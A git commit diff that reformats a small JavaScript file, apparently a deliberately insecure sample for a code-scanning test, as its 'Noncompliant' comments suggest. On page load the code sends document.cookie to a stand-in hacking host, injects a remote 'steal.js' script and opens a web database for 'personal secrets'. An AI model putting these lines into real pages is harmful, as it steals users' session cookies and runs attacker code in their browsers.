03393a5d55e30875b72d34653fe13f2172919b27
Tolis <tolis.christomanos@gamesys.co.uk>
2020-03-16 15:24:20 +0000

    changes

--- hack-script-01.js
+++ hack-script-01.js
@@ -1,22 +1,23 @@
 window.onload = function() {
-    fetch('http://hacking.gamesys.hack/hacks.json?cookiemonster='+this.encodeURI(document.cookie))
+  fetch(
+    "http://hacking.gamesys.hack/hacks.json?cookiemonster=" +
+      this.encodeURI(document.cookie)
+  );
 
+  function include(url) {
+    var s = document.createElement("script");
+    s.setAttribute("type", "text/javascript");
+    s.setAttribute("src", url);
+    document.body.appendChild(s);
+  }
+  include("http://hackers.com/steal.js"); // Noncompliant
 
-    function include(url) {
-        var s = document.createElement("script");
-        s.setAttribute("type", "text/javascript");
-        s.setAttribute("src", url);
-        document.body.appendChild(s);
-      }
-      include("http://hackers.com/steal.js")  // Noncompliant
+  var db = window.openDatabase(
+    "myDb",
+    "1.0",
+    "Personal secrets stored here",
+    2 * 1024 * 1024
+  ); // Noncompliant
 
-      var db = window.openDatabase("myDb", "1.0", "Personal secrets stored here", 2*1024*1024);  // Noncompliant
-
-    this.document.querySelector('body').innerHTML = '<a href="https://community.vuetifyjs.com" target="_blank">Discord Community</a>'
-
-
-}
-
-
-
-  
+  document.querySelector("body").innerHTML = '<a href="https://community.vuetifyjs.com" target="_blank">Discord Community</a>';
+};
